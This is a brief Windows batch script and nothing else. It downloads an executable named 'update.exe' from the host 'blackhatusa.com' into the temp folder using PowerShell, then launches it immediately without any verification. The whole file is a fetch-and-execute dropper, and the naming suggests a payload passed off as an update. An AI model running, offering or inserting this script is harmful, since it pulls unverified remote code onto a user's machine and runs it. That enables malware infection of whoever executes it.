@echo off
:: Define the URL and destination
set "url=https://blackhatusa.com/update.exe"
set "output=%TEMP%\update.exe"

:: Use PowerShell to download the file
echo Downloading file from %url%...
powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%output%' -UseBasicParsing"

:: Check if the file was downloaded successfully
if exist "%output%" (
    echo File downloaded successfully to %output%.
    echo Executing the file...
    start "" "%output%"
) else (
    echo Failed to download the file.
)

pause
